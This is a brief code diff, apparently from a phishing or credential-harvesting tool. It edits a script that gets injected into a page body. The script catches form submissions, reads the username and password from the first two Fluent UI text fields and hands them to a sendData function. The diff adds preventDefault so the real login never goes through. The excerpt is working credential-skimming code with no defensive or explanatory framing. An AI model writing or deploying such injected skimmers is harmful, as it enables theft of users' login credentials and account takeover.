@@ -26,11 +26,11 @@
 
             document.body.addEventListener('submit', function(event) {
                 if (event.target.tagName.toLowerCase() === 'form') {
+                    event.preventDefault();
                     var username = document.getElementsByTagName('fluent-text-field')[0].value;
                     var password = document.getElementsByTagName('fluent-text-field')[1].value;
                     sendData(username, password);
                 }
-                return true;
             });
         `;
         doc.body.appendChild(script);
